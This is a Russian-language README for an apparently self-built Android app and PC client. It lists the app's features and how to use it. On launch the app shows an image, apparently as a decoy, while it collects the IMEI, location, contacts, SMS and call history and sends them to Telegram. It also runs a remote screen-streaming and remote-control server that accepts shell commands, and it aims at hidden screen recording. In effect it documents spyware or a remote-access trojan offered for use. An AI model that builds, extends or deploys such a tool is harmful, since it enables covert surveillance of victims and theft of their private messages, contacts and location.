# Расширенные возможности Android приложения

## Реализованные функции

### 1. Расширенный сбор информации о устройстве

**Файл:** `ready_app/device_info.py`

Собирает максимальную информацию:
- Системная информация (производитель, модель, Android версия, SDK)
- Телефония (оператор, IMEI, SIM информация)
- Сеть (WiFi, IP адреса, MAC адреса)
- Батарея (уровень, статус, здоровье)
- Память и процессор
- Геолокация (последняя известная позиция)
- Установленные приложения
- Контакты (первые 100)
- SMS (последние 50)
- История звонков (последние 50)

Вся информация отправляется в Telegram в структурированном виде и как JSON файл.

### 2. Запись экрана

**Файл:** `ready_app/screen_recorder.py`

Модуль для записи экрана через MediaProjection API:
- Запуск записи в фоне
- Сохранение в файл
- Поддержка скрытой записи (требует разрешения)

**Важно:** MediaProjection требует явного разрешения пользователя при первом запуске.

### 3. Стриминг на PC

**Файл:** `ready_app/streaming_server.py`

WebSocket сервер для стриминга экрана в реальном времени:
- Запускается автоматически при открытии приложения
- Порт по умолчанию: 8888
- Отправляет кадры экрана на PC клиент
- Обрабатывает команды управления от PC

IP адрес устройства отправляется в Telegram при запуске.

### 4. Удаленное управление

**Файл:** `ready_app/remote_control.py`

Модуль для удаленного управления устройством:
- Touch события (tap, swipe, drag)
- Нажатия клавиш (Back, Home, Menu)
- Выполнение shell команд (ограниченный набор)
- Отправка текста

Команды принимаются через streaming_server и выполняются на устройстве.

### 5. PC клиент

**Папка:** `pc_client/`

GUI приложение для Windows/Linux/Mac:
- Подключение к Android устройству
- Просмотр экрана в реальном времени
- Управление мышью (клик = touch)
- Системные кнопки (Back, Home, Menu)

**Запуск:**
```bash
cd pc_client
pip install -r requirements.txt
python pc_client.py
```

## Использование

### На Android устройстве:

1. Установите APK
2. При первом запуске разрешите необходимые разрешения
3. Приложение автоматически:
   - Откроет изображение
   - Соберет информацию о устройстве
   - Отправит данные в Telegram
   - Запустит стриминг сервер

### На PC:

1. Узнайте IP адрес устройства (отправляется в Telegram)
2. Запустите PC клиент:
   ```bash
   cd pc_client
   python pc_client.py
   ```
3. Введите IP адрес и порт (8888)
4. Нажмите "Connect"
5. Управляйте устройством мышью

## Технические детали

### Разрешения Android:

- `INTERNET` - для отправки данных и стриминга
- `READ_EXTERNAL_STORAGE` - для доступа к файлам
- `WRITE_EXTERNAL_STORAGE` - для сохранения логов
- `READ_CONTACTS` - для чтения контактов
- `READ_SMS` - для чтения SMS
- `READ_CALL_LOG` - для чтения истории звонков
- `ACCESS_FINE_LOCATION` - для геолокации
- `ACCESS_COARSE_LOCATION` - для геолокации

### Зависимости:

**Android:**
- python3
- requests
- cython>=0.29.21
- pyjnius>=1.4.2

**PC:**
- Pillow
- numpy
- tkinter (обычно входит в Python)

### Размер APK:

После удаления Kivy размер должен быть ~10-15 МБ (вместо 42.9 МБ).

## Ограничения

1. **Запись экрана:** Требует разрешения пользователя (MediaProjection)
2. **Скрытая запись:** Очень сложна без root доступа
3. **Удаленное управление:** Некоторые команды могут требовать root
4. **Стриминг:** Требует стабильного WiFi соединения

## Логирование

`/sdcard/Download/app_log.txt`

Проверьте этот файл для отладки проблем.
